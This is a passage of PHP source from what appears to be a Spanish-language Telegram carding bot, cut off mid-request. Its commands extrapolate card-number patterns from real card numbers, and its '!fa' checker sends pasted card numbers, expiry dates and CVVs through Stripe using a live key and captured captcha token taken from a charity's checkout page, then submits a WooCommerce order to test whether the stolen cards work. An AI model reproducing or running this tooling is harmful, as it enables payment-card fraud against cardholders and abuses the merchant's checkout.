$respuesta = "".$bin_info."━━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━━•么•━━━━━━━━━━\n";

//$respuesta = "━━━━━━━•⟮ʙɪɴ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$name."\n➭ 𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: 💲".$currency."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
//----------------------END CHECK BIN-----------------------//




elseif((strpos($message, "!extb") === 0)||(strpos($message, "/extb") === 0)||(strpos($message, ".extb") === 0)){
/////SOLO SE USA UN BIN ///

$si = substr($message, 6);
$i1     = explode("|", $si);
$si    = $i1[0];

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ ʙᴀsɪᴄ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /extb xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !extb xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .extb xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//

$lista = substr($message, 6);
$i1     = explode("|", $lista);
$basic    = $i1[0];
$basica = substr("$basic", 0, 10);
$extb = "".$basica."xxxxxx";
$extb = "<code>".$extb."</code>";

$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝐵𝐴𝑆𝐼𝐶𝐴 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extb."\n";
editMessage($chat_id,$respuesta,$id_text);
}




elseif((strpos($message, "!exts") === 0)||(strpos($message, "/exts") === 0)||(strpos($message, ".exts") === 0)){
///SE USAN 2 BINS//
$si = substr($message, 6);
$i1     = explode("-", $si);
$si    = $i1[0];
$si1   = $i1[1];

if (is_numeric($si) && is_numeric($si1) && ($si != '') && ($si1 != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ sɪᴍɪʟ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /exts xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !exts xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .exts xxx-xxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//----------SIMILITUD----------//
$lista = substr($message, 6);
$i1     = explode("-", $lista);
$cc1    = $i1[0];
$cc2    = $i1[1];
//-----------------------------//
$bin = substr("$cc1", 0, 6);
$grupo1 = substr("$cc1", 6, 10);
$grupo2 = substr("$cc2", 6, 10);
//---------------BASICA-----------------/
$R1 = substr("$grupo1", 0, 1);
$R2 = substr("$grupo1", 1, 1);
$R3 = substr("$grupo1", 2, 1);
$R4 = substr("$grupo1", 3, 1);
$R5 = substr("$grupo1", 4, 1);
$R6 = substr("$grupo1", 5, 1);
$R7 = substr("$grupo1", 6, 1);
$R8 = substr("$grupo1", 7, 1);
$R9 = substr("$grupo1", 8, 1);
$R01 = substr("$grupo1", 9, 1);
//----------------------------
$R11 = substr("$grupo2", 0, 1);
$R12 = substr("$grupo2", 1, 1);
$R13 = substr("$grupo2", 2, 1);
$R14 = substr("$grupo2", 3, 1);
$R15 = substr("$grupo2", 4, 1);
$R16 = substr("$grupo2", 5, 1);
$R17 = substr("$grupo2", 6, 1);
$R18 = substr("$grupo2", 7, 1);
$R19 = substr("$grupo2", 8, 1);
$R10 = substr("$grupo2", 9, 1);
///-------------------------------//
if($R1 == "$R11" ){
$J1 = "$R1";
}else{
$J1 = "x";
}
if($R2 == "$R12" ){
$J2 = "$R2";
}else{
$J2 = "x";
}
if($R3 == "$R13" ){
$J3 = "$R3";
}else{
$J3 = "x";
}
if($R4 == "$R14" ){
$J4 = "$R4";
}else{
$J4 = "x";
}
if($R5 == "$R15" ){
$J5 = "$R5";
}else{
$J5 = "x";
}
if($R6 == "$R16" ){
$J6 = "$R6";
}else{
$J6 = "x";
}
if($R7 == "$R17" ){
$J7 = "$R7";
}else{
$J7 = "x";
}
if($R8 == "$R18" ){
$J8 = "$R8";
}else{
$J8 = "x";
}
if($R9 == "$R19" ){
$J9 = "$R9";
}else{
$J9 = "x";
}
if($R01 == "$R10" ){
$J10 = "$R01";
}else{
$J10 = "x";
}

$extra = "$bin$J1$J2$J3$J4$J5$J6$J7$J8$J9$J10";
$extra = "<code>".$extra."</code>";
$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝑆𝐼𝑀𝐼𝐿𝐼𝑇𝑈𝐷 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extra."\n";
editMessage($chat_id,$respuesta,$id_text);
}


elseif((strpos($message, "!exta") === 0)||(strpos($message, "/exta") === 0)||(strpos($message, ".exta") === 0)){
///SE USAN 2 BINS DEL MISMO BIN :V//

$si = substr($message, 6);
$i1     = explode("-", $si);
$si    = $i1[0];
$si1   = $i1[1];

if (is_numeric($si) && is_numeric($si1) && ($si != '') && ($si1 != '')){

}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ ᴀᴠᴀɴᴢ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /exta xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !exta xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .exta xxx-xxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//-------AVANZADA----------//
$lista = substr($message, 6);
$i1     = explode("-", $lista);
$cc1    = $i1[0];
$cc2    = $i1[1];
//-----------------------------//
$com = substr("$cc1", 0, 6);
$con = substr("$cc2", 0, 6);
if($com == "$con" )
{
} else {
$respuesta =  "Las ccs no son del mismo bin !!!\n";
editMessage($chat_id,$respuesta,$id_text);
die();
}
//-----------------------------//
$bin = substr("$cc1", 0, 6);
$cc = substr("$cc1", 0, 8);
$grupo1 = substr("$cc1", 9, 2);
$grupo2 = substr("$cc2", 9, 2);
//-----------------------------//
$sum11 = substr("$grupo1", 0, 1);
$sum12 = substr("$grupo2", 0, 1);
$suma1 = $sum11+$sum12;
//-----------------------------//
$sum21 = substr("$grupo1", 1, 1);
$sum22 = substr("$grupo2", 1, 1);
$suma2 = $sum21+$sum22;
//-----------------------------//
$div1 = $suma1/2;
$div2 = $suma2/2;
//-----------------------------//
$mult1 = $div1*5;
$mult2 = $div2*5;
//-----------------------------//
$gre1 = explode(".", $mult1);
$uno  = $gre1[0];
$gre2 = explode(".", $mult2);
$dos  = $gre2[0];
//-----------------------------//
$fina = $uno+$dos;


$extra = "$cc".$fina."xxxxxx";
$extra = "<code>".$extra."</code>";
$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝐴𝑉𝐴𝑁𝑍𝐴𝐷𝐴 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extra."\n";
editMessage($chat_id,$respuesta,$id_text);
}


elseif((strpos($message, "!exti") === 0)||(strpos($message, "/extl") === 0)||(strpos($message, ".extl") === 0)){
///SE USA SOLO 1 BIN//

$si = substr($message, 6);
$i1     = explode("|", $si);
$si    = $i1[0];

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ ɪɴᴅᴇɴᴛ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /exti xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !exti xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .exti xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//MaTerialDInVerter
$lista = substr($message, 6);
$i1     = explode("|", $lista);
$cc1    = $i1[0];
//-----------------------------//
$bin = substr("$cc1", 0, 6);
$cc = substr("$cc1", 6, 10);
$uno = substr("$cc", 0, 3);
$dos = substr("$cc", 3, 4);
$tres = substr("$cc", 7, 3);
//-----------------------------//
$to1 = substr("$uno", 1, 1);
$to2 = substr("$dos", 1, 2);
$to3 = substr("$tres", 1, 1);
//-----------------------------//
$fin1 = str_replace($to1, 'x', $uno);
$fin2 = str_replace($to2, 'xx', $dos);
$fin3 = str_replace($to3, 'x', $tres);


$extra = "$bin$fin1$fin2$fin3";
$extra = "<code>".$extra."</code>";
$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝐼𝑁𝐷𝐸𝑁𝑇𝐴𝐶𝐼𝑂𝑁 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extra."\n";
editMessage($chat_id,$respuesta,$id_text);

}




elseif((strpos($message, "!extm") === 0)||(strpos($message, "/extm") === 0)||(strpos($message, ".extm") === 0)){


$si = substr($message, 6);
$i1     = explode("-", $si);
$si    = $i1[0];
$si1   = $i1[1];

if (is_numeric($si) && is_numeric($si1) && ($si != '') && ($si1 != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ sʜᴏᴘɪᴀ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /extm xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !extm xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .extm xxx-xxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//-----------MaTerialDInVerter----------//
//4915110176928790-4915110191768499

$lista = substr($message, 6);
$i1     = explode("-", $lista);
$cc1    = $i1[0];
$cc2    = $i1[1];
//------Similitud basica----------//
$T1grupo1 = substr("$cc1", 8, 10);
//-----------------------------//

$T2grupo1 = substr("$cc2", 0, 8);
$T2grupo2 = substr("$cc2", 8, 8);
//----1-----//
$T11 = substr("$T2grupo1", 0, 1);
$T21 = substr("$T2grupo2", 0, 1);
//----1-----//
$T12 = substr("$T2grupo1", 1, 1);
$T22 = substr("$T2grupo2", 1, 1);
//----1-----//
$T13 = substr("$T2grupo1", 2, 1);
$T23 = substr("$T2grupo2", 2, 1);
//----1-----///
$T14 = substr("$T2grupo1", 3, 1);
$T24 = substr("$T2grupo2", 3, 1);
//----1-----///
$T15 = substr("$T2grupo1", 4, 1);
$T25 = substr("$T2grupo2", 4, 1);
//----1-----///
$T16 = substr("$T2grupo1", 5, 1);
$T26 = substr("$T2grupo2", 5, 1);
//----1-----///
$T17 = substr("$T2grupo1", 6, 1);
$T27 = substr("$T2grupo2", 6, 1);
//----1-----///
$T18 = substr("$T2grupo1", 7, 1);
$T28 = substr("$T2grupo2", 7, 1);
//----1-----///
$T19 = substr("$T2grupo1", 8, 1);
$T29 = substr("$T2grupo2", 8, 1);
//---------------------------------//
$mult1 = $T11*$T21;
$mult2 = $T12*$T22;
$mult3 = $T13*$T23;
$mult4 = $T14*$T24;
$mult5 = $T15*$T25;
$mult6 = $T16*$T26;
$mult7 = $T17*$T27;
$mult8 = $T18*$T28;
//---------------------------------//
$suma = "$mult1$mult2$mult3$mult4$mult5$mult6$mult7$mult8";
$die3 = substr("$suma", 0, 8);
$listo = "$T2grupo1$die3";
$grupo2 = substr("$listo", 8, 10);
$ext6 = substr("$listo", 0, 6);
//---------------BASICA-----------------/
$R1 = substr("$grupo2", 0, 1);
$R2 = substr("$grupo2", 1, 1);
$R3 = substr("$grupo2", 2, 1);
$R4 = substr("$grupo2", 3, 1);
$R5 = substr("$grupo2", 4, 1);
$R6 = substr("$grupo2", 5, 1);
$R7 = substr("$grupo2", 6, 1);
$R8 = substr("$grupo2", 7, 1);
//----------------------------
$R11 = substr("$T1grupo1", 0, 1);
$R12 = substr("$T1grupo1", 1, 1);
$R13 = substr("$T1grupo1", 2, 1);
$R14 = substr("$T1grupo1", 3, 1);
$R15 = substr("$T1grupo1", 4, 1);
$R16 = substr("$T1grupo1", 5, 1);
$R17 = substr("$T1grupo1", 6, 1);
$R18 = substr("$T1grupo1", 7, 1);
///-------------------------------//
if($R11 == "$R1" ){
$J1 = "$R11";
}else{
$J1 = "x";
}
if($R12 == "$R2" ){
$J2 = "$R12";
}else{
$J2 = "x";
}
if($R13 == "$R3" ){
$J3 = "$R13";
}else{
$J3 = "x";
}
if($R14 == "$R4" ){
$J4 = "$R14";
}else{
$J4 = "x";
}
if($R15 == "$R5" ){
$J5 = "$R15";
}else{
$J5 = "x";
}
if($R16 == "$R6" ){
$J6 = "$R16";
}else{
$J6 = "x";
}
if($R17 == "$R7" ){
$J7 = "$R7";
}else{
$J7 = "x";
}
if($R18 == "$R8" ){
$J8 = "$R18";
}else{
$J8 = "x";
}
//---------------------------------//
if($J8 == "x" ){
$J9 = "1";
}else{
$J9 = "$R18";
}

$extra = "$ext6$J1$J2$J3$J4$J5$J6$J7$J9";
$extra = "<code>".$extra."</code>";
$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝑆𝑂𝑃𝐻𝐼𝐴 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extra."\n";
editMessage($chat_id,$respuesta,$id_text);

}





elseif((strpos($message, "!fa") === 0)||(strpos($message, "/fa") === 0)||(strpos($message, ".fa") === 0)){

$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

$bin = substr($lista, 0, 6);

$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//
/*
//RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];

	*/
$cc = implode('+', $partes);
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'billing_details%5Bname%5D=Carlos+Perez&billing_details%5Bemail%5D=Dausitherer%40paruz.de&billing_details%5Bphone%5D=4179204022&billing_details%5Baddress%5D%5Bcity%5D=New+york&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bline1%5D=6195+bollinger+rd&billing_details%5Baddress%5D%5Bline2%5D=&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&billing_details%5Baddress%5D%5Bstate%5D=NY&type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fab4f93f420%3B+stripe-js-v3%2Fab4f93f420%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ffacesandvoicesofrecovery.org&time_on_page=58691&client_attribution_metadata%5Bclient_session_id%5D=b1ce9aed-1417-4e80-86b3-9158d1650afa&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=32fd16d7-5922-47b3-9be1-f31c19df298a81e413&muid=9b1a0ea1-0156-4186-9458-c4e8fe27376f75e12a&sid=e8d0ef65-cbfe-4a06-980f-007ab0e3293d922cf1&key=pk_live_51EkCnzKp81anl5QIKzwBcjWRkc7CcluE8E7Y8ruaRVcOd5ATfw8Ian4jgMhds0gVbhGo6fRie8IQbm4znjUeblBA00HrWAWM5Y&_stripe_version=2024-06-20&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoib29iWkU4bGw2K1U1Z1UwYmhaOUFEOWR5dnVnUno0WHZtQTdzeWEzYWxvWHhRMGJNSTRXeFdZc2FWQ2NkRytHUi81R0hpSUphSVRQeGhDZmhhcC9JMmI2NjRkWnIrZUtEQkxtWm1MN1BQOHpscVF2NjdFbVBnZ1ZxalFEc0xPbXBnU0JkRlJ5UHdpNi9mYjY0YzExSEFUMk95aUZ2UGtlek0zamhxRkYrYk1mYk1KaTZ4QUdGNVF0QWp5VmRKOThMREtPL0ZXc0d5ZWpqTVNZNVFvbktTOTBPaGJ4NTlDTEgwcUlyYmhFN1JpN3h0S0k4YmpvaFc3M2Z6UHVvdXFQQ1NEanNWaEoyS1d2ZTVVL3FuSk8zOStCWUQ5cmpWRXZ1Y01FYkljclRYWEM5NSttZWpIaG0rNDB1MU9ra3o1UWNiYmF0T0EyNUw5WXNzMmZUbW9SZTBUT3dSRzBmUyt2STdtMU9Kb2hjbElFeWFmR08rMWQ1b2thL2xQQjU2VCtuNnp3R1M4MG1JckdEYWlkWVJSVnhyeVdIUDBNcnlmL2NGUDR0aUZEMDVFblZpUVNkdTQ4VTB6SUtlQjRwUG5Mem1vYUZPcXAzNDZFaTJ0Q2I0Ty9FR1BFaVZ3ZkVIRUp5c0RVUTdBcUhzSUZYR2NDK3pZZklzTzlHcm5qOEFWZ0ZqRHd3VXl0QnY5a0djc0NGVFFYOVIvSzhrc01IT2dvRzhyZTBUN01jZWYxa0Fjc2NQNEhUVkYyRTlScllsWEZFM0hQZUlRczR5U0Npem8xWFRxamFaNURnb3VERTluMUhSYVk3amtvaUFzZmVvTmF3Q2psVEdjemRCdUZUNjBFajV1bUZ6a1Vyci82VFdPSVhOcXF4WU5YTm55TkN5eU1UU0c5c1A2bjMwcWk4dENTdExnMjd3Zi90MzlmTldnUlV6c1RlOVBXaXZQZGtrQ2M2WGw5bE1WZ0MvT256c2s3S2tWYklxekJBWGdXTTRlZ3hzYlYrcTNOdmluN2JLUDdJZWUyRWdpaGtYOE9qVjdlejkyZ0ZPVFprdFdWNi9xaTNOU0cxS2dGWjBZTDlFYjU4cW9MRlU4cjJhcGFGTnZUWGp5aEhidVBTVFkvVk9TOXBkRnM5T1NRb3FaWWJGRERoeTJtYXNGNWlGRTZ3cXF3MHdWOCtxY1hrVHpia1lpazJMQXYxSVZsWkZBRDhpRjZ2ZGRuUmJNcGdsOC8ySUZBVmhhZ2ZRdTBFR1laQ0ZoOHFQRE9sK1pBK1dIR1g5bXhuTnkrbUhYV3dEbmk2S2x4SktFbFB2MzRPV3ZVQ0IreVF5NGxrU21Qc1RRMUh2SHh4RDRpM0tJcnRIeHRML25LTUJVVXVPN1lxTGQ4NS9sYlRZY1dhcWdxNEs4cjYraDBPNDZLS25YNDVMVS9qMkkvQllpVksvand2VTBBejhnTXo0c3FhUVBmM1MrVExmaDc2MWE2cHJDNDVQOTF3V01GdGVubGd4b2JPMHQ0cG0vV0Z1blVhZ0hUVDRLL3pBWEZ4YjBRMmtIb2lDVUFqLzcvMmVMYm9wclU5dkNrSnFWVklxVnhmaERGN1JISE96NHNBWDQxRWk1bDVKM0Y4TXhOODhPdmxtNHVjTWtxVnlPbzlMNjhKYndWTzMzbldFVFFZSW1RWkVGK2R4bmlFMVJaVllFdnlTUkpud1B3OGNYQ1FxZjdPZXREc2VVUTZObEloV0crUnlIRWt2RVBGWGp1Um5lYTVsWGlkNFZ3UnJRWjJSUENpakxMYVhEMFFRUTNzaWVZRTNVSVR2ODFTVXZhUlhhakZENjJPMnIvVDZZYXlSL0VLdURicUJKZlFwUVhxc2o4QVZsL0JwL1RteVAzM1dHMU80bGZqQUdJeURwMmltR0I0cjRRREFRNThTMjU3VkwzdC96WXQwQ0lhN2RHY1lRRVR5V1JkN1MvWHliNXdRQzdvTytVa01yU3p2QTlJSVYxS21rNlRvdHR3OTZ5TlBHcXY1N3Jzc1pXeDdsUUZ3ajRtRlYwWGtkSnQ3SXBlMVdBNmpNY3c5VEtnWjFEbmVteGtyMDdzcGN1TkhlKzcwTlcybjdFK1Jwbjh1dHlzZ0RHektZVW5UY1d6eWtRc1N6Qm9GVFdBUS8vY3hVWlozVDBJRzY3WlFTSS8raWVTV0hPczN1aXBxbml5UWs3Q0NKckk3OU1TVFNTUEREbjRPK0QrY3lHd04xTk9hdVBvcUswNGRNQ3JwY1ZyWHVrSS9kanM2NC9OamYwZkVQenhNY2FzRlhTaVBrY0xTVDlkcU45Q3ZzSEFlYnphR0pRTFBLN1I4UlRPaVEzakR3M3htdTEycGxWM1Y4Ui9KdktrZzUzV1l4eHRvVVpvYW9ENVlXeG5acG8vb0wyVWdnVGw0RjlacnlsaW15bmk2QkZsTm9oSmRRQlo2TUw1ZWlHejAvWTdOL3ZTWTJaUlNHcEc3T1hITmpFbjZwZ0N4OTVQMVNhRG1IaWNMMTZhN3hheDQwblRtaTZaSTdGUW54dlZtdGlpR3F3dUh4NnNZRUZUaHNIZW83b3A5Nm9QVUI2a3MzeTRuRHVwY1M2ekM1V1pEOFNLbFExbWNKTGh3Ukd0UEZtSkVvZlZkVlVFVEM0djNMdU5taklzamdoZnc2aEgzdFJFTXpkVHRhamNXa0JxcmNIWHo1UzZiRkxRVnZjLzhnbUlsMU9DcmU2SzlSdU53Y0NxVDVZbmJ5V05HdWpTSCtSWGh3RHRlbEdXdmNVb1dpanFneTN0ZmwvNDZhNm56dHRCWDFmbHNBQWVnOXRzYnc9PSIsImV4cCI6MTczMjk5NzUwNCwic2hhcmRfaWQiOjIyMTk5NjA3Mywia3IiOiIxZmQ3Mzk2NSIsInBkIjowLCJjZGF0YSI6ImRyaWpFeGIyRHRPaXExd3VSYmJRY1VGbm9NR2dHdExKSEZjVFVyTUpuekRwVFUwSlh3NmtQalgycVRmWFBFUG5EbDBSYWpsbU83TzBPcjhKMU9jTnZ4NHNyN1czWmpJeXlMMFlndlprdGdIVTVWVU5uM25tNU5QeitNV0dWY3FSNlBzM0RSREwrWmozR2pnSVc3a3cyakxXQjhjQWhTMVpnWmdmZzBMYzVGbUFSbTMvQmxzM21tSUdaaXVlS0J4bi9VSzlEdDRxYXhZK0lkMnUifQ.c6iH8NK4YkuMf1r4mw9gDv6OWagGr0cIpjl4k4xBFfk',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'accept-language: es-US,es;q=0.7',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);
sendPv($myid, $id);


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://facesandvoicesofrecovery.org?wc-ajax=checkout',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Ffacesandvoicesofrecovery.org%2F&wc_order_attribution_session_start_time=2024-11-30+20%3A04%3A22&wc_order_attribution_session_pages=11&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F131.0.0.0+Mobile+Safari%2F537.36&billing_email=Dausitherer%40paruz.de&billing_first_name=Carlos&billing_last_name=Perez&billing_company=&billing_country=US&billing_address_1=6195+bollinger+rd&billing_address_2=&billing_city=New+york&billing_state=NY&billing_postcode=10010&billing_phone=4179204022&fvr_wc_donation_in_honor_of=&order_comments=&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&wc-stripe-new-payment-method=true&woocommerce-process-checkout-nonce=97fee7c96d&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method='.$id.'',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-30%2020%3A04%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-30%2020%3A04%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; 